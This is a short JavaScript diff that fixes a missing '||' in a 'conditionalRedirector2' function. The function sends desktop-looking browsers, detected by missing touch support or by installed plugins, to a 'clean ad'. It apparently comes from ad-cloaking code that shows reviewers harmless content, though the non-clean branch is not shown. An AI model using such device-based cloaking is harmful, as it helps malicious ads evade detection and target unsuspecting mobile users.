@@ -68,7 +68,7 @@ var conditionalRedirector2 = (function()
 			var goClean = false;
 			
 			/* If no mobile device, redirect to clean ad */
-			if (!isTouchDevice()
+			if (!isTouchDevice() ||
 				hasPlugins() ||			// indicates desktop browser
 				info.goClean)
 			{
